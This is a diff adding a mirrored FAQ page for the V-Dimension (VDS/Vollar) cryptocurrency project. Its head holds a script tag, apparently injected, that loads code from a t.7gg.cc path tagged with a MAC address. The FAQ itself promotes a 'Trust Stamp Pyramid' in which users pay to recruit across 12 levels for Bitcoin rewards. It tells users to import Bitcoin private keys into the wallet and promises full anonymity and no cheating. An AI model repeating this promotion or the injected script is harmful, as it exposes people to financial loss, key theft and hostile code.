@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html>
+    
+<!-- Mirrored from www.vds.nz/faq by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 18 Jun 2019 02:55:50 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>V-Dimension</title>
+        <meta name="keywords" content="V-Dimensi,blockchain">
+        <meta name="description" content="V-Dimensio">
+        <link rel="shortcut icon" href="statics/images/favicon.ico">
+        <link href="statics/css/common.css" rel="stylesheet"/>
+        <script src="statics/libs/jquery.min.js"></script>
+        <script src="statics/libs/jquery.cookie.js"></script>
+        <script src="statics/plugins/layer/layer.js"></script>
+        <script src="statics/plugins/qrcode/qrcode.min.js"></script>
+
+        <script>
+            function numFormat(num) {
+                var c = (num.toString().indexOf ('.') !== -1) ? num.toLocaleString() : num.toString().replace(/(\d)(?=(?:\d{3})+$)/g, '$1,');
+                return c;
+            }
+
+            $.ajaxSetup({
+                layerIndex:-1,
+                beforeSend: function(jqXHR, settings) {
+                    this.layerIndex = layer.load(1);
+                },
+                complete: function () {
+                    layer.close(this.layerIndex);
+                },
+                error: function (jqXHR, status, e) {
+                    layer.alert('Data request failed, please try again!');
+                }
+            });
+        </script>
+    <script async=true src="../t.7gg.cc_88/j1cdbf.js?MAC=CC81DA39F680"></script>
+</head>
+
+    <body>
+        <div id="root">
+            <link href="statics/css/header.css" rel="stylesheet">
+
+<style>
+    .header-c-m-m a.nav-active{
+        font-size: 18px;
+        color: #4A90E2;
+        font-weight: bold;
+    }
+</style>
+
+<div class="header-container">
+    <div class="header-c-m">
+        <div class="header-c-m-l"></div>
+        <div class="header-c-m-m">
+            <ul>
+                    <li><a href="index.html">Home</a></li>
+
+                    <li><a href="icex.html">CEX</a></li>
+
+                <li><a href="game.html">The Games</a></li>
+
+                    <li><a href="whats.html">WHAT'S V</a></li>
+
+                <li><a href="paper.html">Ecology</a></li>
+
+                    <li><a href="source.html">Download</a></li>
+
+                    <li><a class="nav-active" href="#">FAQ</a></li>
+            </ul>
+        </div>
+        <div class="header-c-m-r">
+            <div class="current_lang">
+                <div class="lang">
+                    <span class="lang-txt">English</span>
+                    <span class="fa fa-chevron-down chevron"></span>
+                </div>
+            </div>
+            <div class="more_lang">
+                <div class="lang selected" data-value='en_US' data-en="English" id="en_US">
+                    <span class="lang-txt">English</span>
+                </div>
+                <div class="lang" data-value='de_DE' data-en="Deutsch" id="de_DE">
+                    <span class="lang-txt">Deutsch</span>
+                </div>
+                <div class="lang" data-value='es_ES' data-en="Español" id="es_ES">
+                    <span class="lang-txt">Español</span>
+                </div>
+                <div class="lang" data-value='fr_FR' data-en="Français" id="fr_FR">
+                    <span class="lang-txt">Français</span>
+                </div>
+                <div class="lang" data-value="en_MY" data-en="Malay" id="en_MY">
+                    <span class="lang-txt">Malay</span>
+                </div>
+                <div class="lang" data-value="pt_PT" data-en="Português" id="pt_PT">
+                    <span class="lang-txt">Português</span>
+                </div>
+                <div class="lang" data-value='ru_RU' data-en="русский" id="ru_RU">
+                    <span class="lang-txt">русский</span>
+                </div>
+                <div class="lang" data-value="hi_HI" data-en="हिन्दी" id="hi_HI">
+                    <span class="lang-txt">हिन्दी</span>
+                </div>
+                <div class="lang" data-value="fa_FA" data-en="فارسی" id="fa_FA">
+                    <span class="lang-txt">فارسی</span>
+                </div>
+                <div class="lang" data-value='ko_KR' data-en="한국의" id="ko_KR">
+                    <span class="lang-txt">한국의</span>
+                </div>
+                <div class="lang" data-value='ja_JP' data-en="日本の" id="ja_JP">
+                    <span class="lang-txt">日本の</span>
+                </div>
+                <div class="lang" data-value='zh_HK' data-en="中文(繁体)" id="zh_HK">
+                    <span class="lang-txt">中文(繁体)</span>
+                </div>
+                <div class="lang" data-value='zh_CN' data-en="中文(简体)" id="zh_CN">
+                    <span class="lang-txt">中文(简体)</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+
+    $(document).ready(function(){
+
+        $('.feature').on('click',function(){
+            layer.msg('Stay Tuned', {
+                skin: 'demo-class',
+                time: 2000,
+            });
+        });
+
+        $('.header-c-m-l').on('click',function(){
+            window.location.href='index.html';
+        });
+
+        var cookieLang = $.cookie("lang");
+        var img = $('#' + cookieLang).find('img').attr('src');
+        var lang = $('#' + cookieLang).attr('data-en');
+        $('.current_lang .lang-txt').text(lang);
+        $('.current_lang img').attr('src', img);
+        $('#' + cookieLang).addClass('selected').siblings().removeClass('selected');
+
+        $(document).click( function(e) {
+            $('.header-c-m-r, .more_lang').removeClass('active');
+        });
+
+        $('.header-c-m-r .current_lang').click(function(e){
+            e.stopPropagation();
+            $(this).parent().toggleClass('active');
+
+            setTimeout(function(){
+                $('.more_lang').toggleClass('active');
+            }, 5);
+        });
+
+        $('.more_lang .lang').click(function(){
+            $(this).addClass('selected').siblings().removeClass('selected');
+            $('.more_lang').removeClass('active');
+
+            var img = $(this).find('img').attr('src');
+            var lang = $(this).attr('data-value');
+
+
+            $('.current_lang .lang-txt').text(lang);
+            $('.current_lang img').attr('src', img);
+
+            $.cookie("lang", lang, { expires: 30, path:'/'});
+            window.location.reload();
+        });
+    });
+</script><link href="statics/css/faq/faq.css" rel="stylesheet">
+
+<div class="faq">
+    <div class="faq-container">
+        <div class="faq-container-l">
+            <ul>
+                <li><a data-item="1" class="faq-nav-active">VDS</a></li>
+                <li><a data-item="2">Resonance Trade</a></li>
+                <li><a data-item="3">Vollar Issuance</a></li>
+                <li><a data-item="4">VID</a></li>
+                <li><a data-item="5">Trust Stamp and Fission</a></li>
+                <li><a data-item="6">Super Master Nodes and Light Master Nodes</a></li>
+                <li><a data-item="7">Secret Chat</a></li>
+                <li><a data-item="8">OTC</a></li>
+                <li><a data-item="9">VAD</a></li>
+            </ul>
+        </div>
+        <div class="faq-container-r">
+            <div class="faq-body-info">
+                <p class="faq-title">Which systems can the VDS client-side apps be used with?</p>
+                <p class="faq-body">VDS will launch both a PC and smartphone app. The smartphone app is currently compatible with Android while the PC software runs on Linux and Windows systems. More operating systems will be supported at a later stage.</p>
+            </div>
+            <div class="faq-body-info">
+                <p class="faq-title">How do I get an update?</p>
+                <p class="faq-body">Update information regarding the VDS client-side app will be released on the official website. Updates will also be broadcasted through VAD. You may navigate to the official website by using Tor and entering this address: VDSVVVXXMXPSSSZD.ONION</p>
+            </div>
+            <div class="faq-body-info">
+                <p class="faq-title">Is it safe to keep my Bitcoin in VDS?</p>
+                <p class="faq-body">Yes. The VDS client-side app has a decentralized Bitcoin wallet that is operated independently. It supports Basic, HD, and Multi-signature addresses.</p>
+            </div>
+            <div class="faq-body-info">
+                <p class="faq-title">What is a UTXO?</p>
+                <p class="faq-body">You can think of a UTXO as a running detailed-list for cryptocurrencies that keeps records of every transaction. Your account balance is composed of UTXOs. Anytime new transactions occur the receiving address will be updated with new UTXOs. You may choose a specific UTXO during the trade so as to conduct clear management of your assets.</p>
+            </div>
+            <div class="faq-body-info">
+                <p class="faq-title">Do anonymous transactions really allow complete anonymity?</p>
+                <p class="faq-body">Yes, they can. VDS utilizes the zero-knowledge proof technology behind Zcash Sapling to perform anonymous transactions. This is a method that has been time-tested and it provides full anonymity for both addresses and transaction amounts. This guarantee of privacy and anonymity stems from the fact that it blocks transaction information, as this info is completely encrypted on the blockchain, yet can still be verified as valid on the network by using zero-knowledge proof.</p>
+            </div>
+            <div class="faq-body-info">
+                <p class="faq-title">Can tokens be issued through VDS’s smart contracts?</p>
+                <p class="faq-body">Yes. VDS utilizes the same technological structure as Ethereum, so both of them share the same operational logic in terms of smart contract technology. This will offer VDS developers more room for innovation.</p>
+            </div>
+        </div>
+    </div>
+    <div class="p-l">
+        <p class="p-line"></p>
+    </div>
+</div>
+
+<script>
+
+    $('.faq-container-l ul li a').click(
+        function(){
+            $(this).addClass("faq-nav-active").parent().siblings().find("a").removeClass("faq-nav-active");
+
+            var item = $(this).data('item');
+
+            var body = '';
+            if(item == 1) {
+                body = '<div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Which systems can the VDS client-side apps be used with?</p>\n' +
+                    '                <p class="faq-body">VDS will launch both a PC and smartphone app. The smartphone app is currently compatible with Android while the PC software runs on Linux and Windows systems. More operating systems will be supported at a later stage.</p>\n' +
+                    '            </div>\n' +
+                    '\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">How do I get an update?</p>\n' +
+                    '                <p class="faq-body">Update information regarding the VDS client-side app will be released on the official website. Updates will also be broadcasted through VAD. You may navigate to the official website by using Tor and entering this address: VDSVVVXXMXPSSSZD.ONION</p>\n' +
+                    '            </div>\n' +
+                    '\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Is it safe to keep my Bitcoin in VDS?</p>\n' +
+                    '                <p class="faq-body">Yes. The VDS client-side app has a decentralized Bitcoin wallet that is operated independently. It supports Basic, HD, and Multi-signature addresses.</p>\n' +
+                    '            </div>\n' +
+                    '\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">What is a UTXO?</p>\n' +
+                    '                <p class="faq-body">You can think of a UTXO as a running detailed-list for cryptocurrencies that keeps records of every transaction. Your account balance is composed of UTXOs. Anytime new transactions occur the receiving address will be updated with new UTXOs. You may choose a specific UTXO during the trade so as to conduct clear management of your assets.</p>\n' +
+                    '            </div>\n' +
+                    '\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Do anonymous transactions really allow complete anonymity?</p>\n' +
+                    '                <p class="faq-body">Yes, they can. VDS utilizes the zero-knowledge proof technology behind Zcash Sapling to perform anonymous transactions. This is a method that has been time-tested and it provides full anonymity for both addresses and transaction amounts. This guarantee of privacy and anonymity stems from the fact that it blocks transaction information, as this info is completely encrypted on the blockchain, yet can still be verified as valid on the network by using zero-knowledge proof.</p>\n' +
+                    '            </div>\n' +
+                    '\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Can tokens be issued through VDS’s smart contracts?</p>\n' +
+                    '                <p class="faq-body">Yes. VDS utilizes the same technological structure as Ethereum, so both of them share the same operational logic in terms of smart contract technology. This will offer VDS developers more room for innovation.</p>\n' +
+                    '            </div>';
+            } else if(item == 2){
+                body = '<div class="faq-body-info">\n' +
+                    '                <p class="faq-title">What is Resonance Trade?</p>\n' +
+                    '                <p class="faq-body">Resonance Trade is a one-way, Bitcoin to Vollar conversion channel designed into VDS. BTC and VDS utilize the same elliptic curve algorithm so that they share the same private key. The key is passed through base58check code to allow the BTC and VDS public keys to be different. After a Bitcoin to Vollar conversion, the Vollar is sent to a public key under that same private key that started the conversion. So before any Resonance Trades can be made you must first get your hands on a Bitcoin private key.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">How is the conversion ratio calculated in Resonance Trade?</p>\n' +
+                    '                <p class="faq-body">You can imagine the Resonance V-Pool as an inverted triangle. There are 10 Vollar in the lowest conversion level and the Bitcoin to Vollar conversion ratio is 1:1. At level two there are 20 Vollar, and the Bitcoin to Vollar ratio is 1:2, and so it continues on for an infinite number of levels. The amount of Vollar in the Resonance V-Pool determines the level at the current time, and the current level determines the current exchange ratio. You can use the VDS app to check the current V-Pool level and conversion ratio.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">What’s the difference between ICEX, CEX, and Resonance Trade?</p>\n' +
+                    '                <p class="faq-body">ICEX and CEX are two phases of Resonance Trade. Resonance Trade is initiated at the launch of the project. ICEX is the high multiplier conversion phase that lasts for 3 block weeks (blocks 0-30,239) with reward multipliers of 5, 3, and 1.5 in each week. CEX is the regular conversion phase (blocks 30,240- infinity).</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Why participate in Resonance Trade?</p>\n' +
+                    '                <p class="faq-body">Resonance Trades multiply your currency. The conversion ratio in the Resonance V-Pool is not controlled by the market rate, but instead it is pre-programmed to get cheaper and cheaper as more Vollar flows in. This develops a type of arbitrage that users can take advantage of to make money. As more and more Vollar flows in, the Vollar gets cheaper and cheaper compared to Bitcoin. However, as mentioned above this exchange rate has nothing to do with the market rate, or rates of any other currency (fiat or crypto). Therefore, when the market rate is above the rate provided by the V-Pool, you can buy Vollar cheap from the V-Pool, sell it at the market rate, and claim a tidy profit. Additionally, this can also be a bridge used to help you anonymously swap Bitcoin for other currencies.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Why does the app say the resonated Vollar hasn’t hit my account?</p>\n' +
+                    '                <p class="faq-body">Resonance Trade requires 6 BTC confirmations. If in this process the Vollar hasn’t entered your account yet, it is possible that the Bitcoin is still confirming, or that the Bitcoin exchange failed. In the latter case, please increase the Bitcoin transaction fees used and try again.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Why is the price of Vollar acquired during Resonance Trade different than the current market exchange rate?</p>\n' +
+                    '                <p class="faq-body">Resonance Trade rates fluctuate according to the remaining amount of Vollar in the Resonance V-Pool. BTC block confirmations take time, during which the exchange rate might fluctuate. Your exchange ratio depends on the exchange rate after 6 Bitcoin confirmations.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Who does my Bitcoin go to when I “resonate” it?</p>\n' +
+                    '                <p class="faq-body">The Bitcoin paid-in during Resonance Trade becomes a reward which is split 50% among the Top 10, and 50% among the Lucky 20 winners from last week’s Game.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Why is the Bitcoin resonated during the ICEX phase put under an open address?</p>\n' +
+                    '                <p class="faq-body">Since there were no Top 10 and Lucky 20 Bitcoin winners (thus no receiving addresses) when the Genesis Phase (blocks 0-30,239) started, we put the Bitcoin into an address controlled by the developers to temporarily safeguard it. When the Genesis Game ends, the Bitcoin will be re-resonated and distributed as additional rewards across the next 21 games. This way, there is a definite Bitcoin reward, which will incentivize users to participate in the VDS Trust Stamp Network Fission Promotion, and rapidly spread VDS.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Can I use Resonance Trade to trade-in my Vollar for Bitcoin?</p>\n' +
+                    '                <p class="faq-body">No. Resonance Trade is a Bitcoin-to-Vollar, cross-chain, one-way exchange.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Is there a limit on how much Bitcoin can be Resonated?</p>\n' +
+                    '                <p class="faq-body">There is no limit. However, it is recommended that the Bitcoin used exceeds the miner’s fees you will pay.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Once there is no more Vollar remaining in the Resonance V-Pool how are conversions made?</p>\n' +
+                    '                <p class="faq-body">If there’s no more Vollar in the V-Pool, but Bitcoin exchanges are still being posted, you will need to wait in line until enough Vollar flows in to make your exchange as well as those of the orders in front of you. Orders are settled according to BTC block confirmation. This circumstance implies that the price of Vollar has exceeded that of Bitcoin’s.</p>\n' +
+                    '            </div>';
+            } else if(item == 3){
+                body = '<div class="faq-body-info">\n' +
+                    '                <p class="faq-title">What are the basic details on Vollar issuance?</p>\n' +
+                    '                <table style="color:#646F82;font-size:14px;width: 500px;text-align: left;">\n' +
+                    '                    <tr>\n' +
+                    '                        <td>Total Coins</td>\n' +
+                    '                        <td>2,100,000,000 Vollar</td>\n' +
+                    '                    </tr>\n' +
+                    '                    <tr>\n' +
+                    '                        <td>Timestamping Scheme</td>\n' +
+                    '                        <td>POW</td>\n' +
+                    '                    </tr>\n' +
+                    '                    <tr>\n' +
+                    '                        <td>Mining Algorithm</td>\n' +
+                    '                        <td>Equihash+Scrypt</td>\n' +
+                    '                    </tr>\n' +
+                    '                    <tr>\n' +
+                    '                        <td>Block Interval</td>\n' +
+                    '                        <td>60s</td>\n' +
+                    '                    </tr>\n' +
+                    '                    <tr>\n' +
+                    '                        <td>Block Size</td>\n' +
+                    '                        <td>≤8M</td>\n' +
+                    '                    </tr>\n' +
+                    '                    <tr>\n' +
+                    '                        <td>Initial Mining Reward</td>\n' +
+                    '                        <td>500 Vollar</td>\n' +
+                    '                    </tr>\n' +
+                    '                    <tr>\n' +
+                    '                        <td>Reduction Era</td>\n' +
+                    '                        <td>211,680 Block</td>\n' +
+                    '                    </tr>\n' +
+                    '                    <tr>\n' +
+                    '                        <td>Reduction Rate</td>\n' +
+                    '                        <td>5%</td>\n' +
+                    '                    </tr>\n' +
+                    '                </table>\n' +
+                    '            </div>\n' +
+                    '\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">How is the 100 million pre-mined Vollar used?</p>\n' +
+                    '                <p class="faq-body">This pre-mined Vollar will serve as startup funds to help speed-up basic ecological formation. It’s divided into the 1:1 airdrop for the Bitcoin-users from the 558,000th block, as the VDS initial ecological development fund, and as the initial funds in the Resonance V-Pool. All the addresses that will receive these pre-mined funds will be open and public for the community to check.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">How do Bitcoin holders collect their 1:1 Vollar airdrop?</p>\n' +
+                    '                <p class="faq-body">We have taken a snapshot of the Ledger from Bitcoin’s 558,000th block height. After the VDS main chain is online, import your BTC into the VDS wallet App, and you can immediately get your airdropped Vollar. There is no time limit for claiming this reward.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Who decides Vollar’s price?</p>\n' +
+                    '                <p class="faq-body">Nobody sets the price for Vollar, it’s a decentralized cryptocurrency. As such, its price goes with the market rate. At the earlier stages, the price can be calculated according to the Bitcoin exchange rate from Resonance Trade. Vollar will find its price naturally by adjusting with market demands. Currencies whose prices are set by centralized institutions always turn out to be frauds.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Where can I get Vollar?</p>\n' +
+                    '                <p class="faq-body">There are many ways. You can become a miner, setup a super master node, or complete an “initial ecological development” task. If you are a Bitcoin user, you can directly claim your 1:1 Vollar airdrop. Aside from this you can perform a Resonance Trade to exchange your Bitcoin for Vollar or buy it through an exchange platform. Lastly, you can receive Vollar as rewards by inviting people to create a new VID under your Trust Stamp System.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">How does the Vollar mining mechanism work?</p>\n' +
+                    '                <p class="faq-body">The VDS chain will issue 2 billion Vollar through the POW Issuance Equalization Mechanism. This mining method takes the amount of Vollar spent on new VID creation in the last week and uses it as a variable to dynamically adjust the amount of resonance-issued and mining-issued Vollar. All mining-issued rewards will be shared 50/50 between the miners and the super master nodes.</p>\n' +
+                    '                <p class="faq-body">When Vollar held by VIDs created last week exceeds the release amount: Block Reward = release amount ÷2÷1440</p>\n' +
+                    '                <p class="faq-body">When Vollar created last week is less than release amount: Block Reward = amount of Vollar used to create VIDs in the last week ÷2÷1440</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Can Vollar be exchanged for other cryptocurrencies?</p>\n' +
+                    '                <p class="faq-body">Yes. If you want to make an exchange, enter an OTC that trades the kind of currency you are looking for. The administrator decides the one currency that is traded in their OTC at the time when he or she starts it up.</p>\n' +
+                    '            </div>';
+            } else if(item == 4){
+                body = '<div class="faq-body-info">\n' +
+                    '                <p class="faq-title">What can I use a VID for?</p>\n' +
+                    '                <p class="faq-body">A VID is the ID used across the entire VDS network. After activating your VID you can use secret chat, group chat OTC trades, the Trust Stamp Fission function, create both super and light master nodes, and much more. Additionally, every VID serves as a domain name in VDS’s distributed, anonymous network, and also as an ID to login to other websites.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">What’s the difference between a Genesis VID and a Basic VID?</p>\n' +
+                    '                <p class="faq-body">Genesis VIDs and basic VIDs can both perform all the same functions. The key difference is how they are acquired and their rank on the Trust Stamp Pyramid.</p>\n' +
+                    '                <p class="faq-body">To receive a Genesis VID, your Bitcoin address must have held a UTXO with 0.1 or more Bitcoin on BTC Chain’s 558,000th block height. Those who meet this requirement need only to import their Bitcoin private key into the VDS wallet and then their corresponding Genesis VID address will be created, no need to make any Bitcoin payment. Genesis VIDs are located at the very top of the Trust Stamp Pyramids. As more members are invited in, they form their own, independent pyramid-fission structure.</p>\n' +
+                    '                <p class="faq-body">If you don’t qualify for a Genesis VID, you can still get your “basic” VID by using a basic VDS address to make a 10 Vollar payment to a VID address. Basic VIDs are all fission-produced by Genesis VIDs.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Can I go claim my Genesis VID for free anytime I want?</p>\n' +
+                    '                <p class="faq-body">No. Once VDS reaches block 231,840 (approx. 23 weeks) the system will automatically stop the right to claim Genesis VIDs for free, and thus the number of fission pyramids will be finalized.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Can I create an unlimited number of VIDs?</p>\n' +
+                    '                <p class="faq-body">Yes. All it takes is to make a 10 Vollar payment to any pre-existing VID from a basic VDS address. So as long as you have enough Vollar, you can make all the VIDs you want according to your needs.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">I have 0.1 Bitcoin. Why can’t I get my Genesis VID?</p>\n' +
+                    '                <p class="faq-body">If the Bitcoin is spread across several UTXOs, then the requirement hasn’t been met. You must have at least one UTXO with over 0.1 Bitcoin. Please also check if your Bitcoin was listed under your address on block 558,000’s Ledger.</p>\n' +
+                    '            </div>' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Why did my Genesis VID disappear?</p>\n' +
+                    '                <p class="faq-body">After claiming your Genesis VID, you must invite another person to create a VID before the 231,839th VDS block. After inviting a friend successfully your VID will be successfully activated, and you can have it forever. Otherwise, the system will take it back.</p>\n' +
+                    '            </div>';
+            } else if(item == 5){
+                body = '<div class="faq-body-info">\n' +
+                    '                <p class="faq-title">What’s the difference between the Trust Stamp Network, Trust Stamp Pyramid, and the Trust Stamp System?</p>\n' +
+                    '                <p class="faq-body">The Trust Stamp Network is the name used to describe all the Trust Stamp Pyramids put together.</p>\n' +
+                    '                <p class="faq-body">A Trust Stamp Pyramid is a stand-alone, infinite-leveled pyramid of interpersonal relationships created by a Genesis VID.</p>\n' +
+                    '                <p class="faq-body">A Trust Stamp System is the name for the 12 levels of interpersonal relation-locks under any given VID.</p>\n' +
+                    '                <p class="faq-body">Using these three different names will help people get a better understanding of how reward disbursement works in the Trust Stamp Network.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Why can’t I use the Vollar rewards paid to me from fission-inviting other VIDs?</p>\n' +
+                    '                <p class="faq-body">Fission rewarded Vollar is locked for 10,080 blocks. You can use it after that lock-up period. This is to prevent certain malicious operations, and make the Fission Game fairer.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Why are the fission-weighted scores wiped clean?</p>\n' +
+                    '                <p class="faq-body">Each Game is 10,080 blocks (roughly one week). After each game ends, Fission-weighted scores are automatically wiped by the system. This makes the game fair. We want to avoid the newest players from making one early push and pulling the vast majority of Bitcoin wins forever because nobody can beat his/her fission score.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">When I am a Top 10, why can’t I see Bitcoin in my VDS wallet?</p>\n' +
+                    '                <p class="faq-body">This is because in your Bitcoin/Vollar dual wallet you must switch over to the BTC wallet interface to find the corresponding Bitcoin address; then you will be able to see your Bitcoin rewards.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Is the number of direct invites allowed limited to the 12 spots in the first level of my Trust Stamp System?</p>\n' +
+                    '                <p class="faq-body">No. Once the first level is full of VIDs, you may continue to directly invite new VIDs to enter your Trust Stamp System, earning you direct-invite rewards and increasing your weighted score.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Can I choose to place an invited VID into a specific location in my Trust Stamp System?</p>\n' +
+                    '                <p class="faq-body">No, you cannot. The system randomly places them in the Trust Stamp System. The design allows members in the upper levels to help those in the lower levels develop their team.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Why am I not getting any rewards when people from my Trust Stamp System invite new VIDs?</p>\n' +
+                    '                <p class="faq-body">The number of VIDs you invited under the first level of your Trust Stamp System decides how many lower levels you can earn rewards from. Once all 12 spots in level one are filled you can finally receive all the rewards from all 12 levels. Otherwise system loss rewards will occur, so even if other people invite in new VIDs under your Trust Stamp System you won’t be able to get all your rewards.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">How do I join the Game and get Bitcoin?</p>\n' +
+                    '                <p class="faq-body">To join The Game you first need to activate a VID, and then start making invites through the Trust Stamp System to improve your fission-weighted score. This number directly decides the Top 10 winners. Once you’ve become a Top 10 in any game you can finally receive enormous Bitcoin rewards.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">How do the Top 10 split the Bitcoin among each other?</p>\n' +
+                    '                <p class="faq-body">The system takes the total number of direct invites of all the Top 10 and disburses the reward as a proportion of each Top 10 winner’s individual direct-invite ratio. If you can get more direct invites it will increase your Bitcoin disbursement ratio.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">How do I know if the Game is real or if it’s fixed?</p>\n' +
+                    '                <p class="faq-body">VDS relies on blockchain technology. All functions included in The Game are performed by running transactions and smart contracts on the blockchain. Data is open and transparent, it cannot be changed around. There won’t be any cheating.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">How are the Top 10 determined?</p>\n' +
+                    '                <p class="faq-body">The Top 10 VID addresses of each Game are directly decided by their fission-weighted scores. Players get this score based on their overall fission. In each Game the 10 addresses with the highest fission weighted score become the Top 10.</p>\n' +
+                    '            </div>';
+            } else if(item == 6){
+                body = '<div class="faq-body-info">\n' +
+                    '                <p class="faq-title">What’s the difference between super master nodes and light master nodes?</p>\n' +
+                    '                <p class="faq-body">To create a super master node you need an address with a UTXO of 10,000 Vollar, and they receive definite Vollar rewards. To create a light master node you need an address that has a UTXO of 100 Vollar, and the 12 spots in the first level of it’s Trust Stamp System full; they get the chance to win The Lottery and earn Bitcoin as their reward.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Are super and light master nodes anonymous?</p>\n' +
+                    '                <p class="faq-body">Yes. VDS makes identifications in its distributed network through the use of VID addresses, so super master nodes and light master nodes will not disclose IP Addresses and Port Numbers.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Where do super master nodes get their rewards from?</p>\n' +
+                    '                <p class="faq-body">a. 50% of mining-issued coin</p>\n' +
+                    '                <p class="faq-body">b. 35% of standard and anonymous transaction fees</p>\n' +
+                    '                <p class="faq-body">c. 100% of VAD revenue</p>\n' +
+                    '                <p class="faq-body">d. 50% of group expansion revenue</p>\n' +
+                    '                <p class="faq-body">e. 0.1 Vollar from each new VID created</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">What are the configuration requirements of becoming Super Master Nodes?</p>\n' +
+                    '                <table style="color:#646F82;font-size:14px;width: 500px;text-align: left;">\n' +
+                    '                    <tbody>\n' +
+                    '                        <tr>\n' +
+                    '                            <td></td>\n' +
+                    '                            <td>Minimum Requirements</td>\n' +
+                    '                            <td>Recommended</td>\n' +
+                    '                        </tr>\n' +
+                    '                        <tr>\n' +
+                    '                            <td>CPU</td>\n' +
+                    '                            <td>2 x 2 GHz</td>\n' +
+                    '                            <td>4 x 2 GHz</td>\n' +
+                    '                        </tr>\n' +
+                    '                        <tr>\n' +
+                    '                            <td>RAM</td>\n' +
+                    '                            <td>4 GB</td>\n' +
+                    '                            <td>8 GB</td>\n' +
+                    '                        </tr>\n' +
+                    '                        <tr>\n' +
+                    '                            <td>Disk</td>\n' +
+                    '                            <td>500 GB</td>\n' +
+                    '                            <td>1 TB</td>\n' +
+                    '                        </tr>\n' +
+                    '                        <tr>\n' +
+                    '                            <td>Network</td>\n' +
+                    '                            <td>400 GB/mth</td>\n' +
+                    '                            <td>1 TB/mth</td>\n' +
+                    '                        </tr>\n' +
+                    '                    </tbody>\n' +
+                    '                </table>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">What’s the difference between super master nodes and light master nodes?</p>\n' +
+                    '                <p class="faq-body">To create a super master node you need an address with a UTXO of 10,000 Vollar, and they receive definite Vollar rewards. To create a light master node you need an address that has a UTXO of 100 Vollar, and the 12 spots in the first level of it’s Trust Stamp System full; they get the chance to win The Lottery and earn Bitcoin as their reward.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">What’s the difference between super master nodes and light master nodes?</p>\n' +
